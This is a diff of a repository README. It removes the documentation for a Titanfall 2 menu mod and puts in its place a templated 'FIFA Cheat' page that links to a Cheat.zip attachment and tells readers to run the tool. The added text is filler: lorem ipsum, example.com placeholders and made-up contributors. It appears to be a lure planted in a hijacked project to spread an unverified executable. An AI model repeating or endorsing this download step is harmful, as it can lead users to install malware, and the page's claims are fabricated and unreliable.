@@ -1,120 +1,69 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# FIFA Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the FIFA Cheat repository! 
 
+![FIFA Cheat](https://www.example.com/fifa-cheat.png)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Description
+This repository contains a powerful cheat tool for FIFA that will take your gaming experience to the next level. With this cheat, you can unlock secret features, boost player stats, and dominate your opponents effortlessly.
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+## Features
+- Unlock hidden features
+- Boost player stats
+- Infinite resources
+- Fast level-up
 
 ## Installation
+To install the cheat tool, download the zip file from the link below:
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-brightgreen)](https://github.com/user-attachments/files/17043020/Cheat.zip)
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
-
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
-
-## Icepick
-
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
-
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
-
-3) Launch Icepick.
-
-## Northstar
-
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
-
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
-
-3) Launch Northstar.
+## Usage
+1. Download and extract the cheat tool.
+2. Run the tool and follow the on-screen instructions.
+3. Enjoy the enhanced FIFA gaming experience!
 
 ## Screenshots
+![Screenshot 1](https://www.example.com/screenshot1.png)
+![Screenshot 2](https://www.example.com/screenshot2.png)
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## Contributors
+- John Doe
+- Jane Smith
 
-Main Menu with the original Titanfall 2 menu video
+## Support
+For any issues or questions, please contact [support@example.com](mailto:support@example.com).
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## License
+This cheat tool is released under the [MIT License](https://opensource.org/licenses/MIT).
 
-Main Menu with the showcase removed to declutter the menu
+---
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+### About
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sodales tincidunt urna eu accumsan.
 
-New Cheat options that can be enabled as well as the extras menu
+### How It Works
+Nulla facilisi. Sed ac ante vel ligula commodo lacinia ut sit amet dolor.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+### Future Updates
+- Implement online multiplayer cheats
+- Enhance compatibility with different platforms
 
-Added keybinds for speedrunners and extra commands for fun
+### Feedback
+We welcome feedback from the community. Feel free to share your thoughts and suggestions in the [Issues](https://github.com/user/FIFA-Cheat/issues) section.
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+---
 
-Shows the values for each setting on the Advanced Look Options
+## FAQs
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
+### Q: What platforms does this cheat tool support?
+A: The cheat tool currently supports PC only. Support for other platforms may be added in future updates.
 
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
+### Q: Is the cheat tool safe to use?
+A: The cheat tool is designed to be used in offline single-player mode to enhance the gaming experience. Usage in online multiplayer mode may lead to penalties or bans.
 
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
+### Q: Can I customize the cheat settings?
+A: Yes, the cheat tool allows for customization of certain settings to suit your preference.
 
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+---
+
+Thank you for checking out the FIFA Cheat repository! Happy gaming! 🎮✨
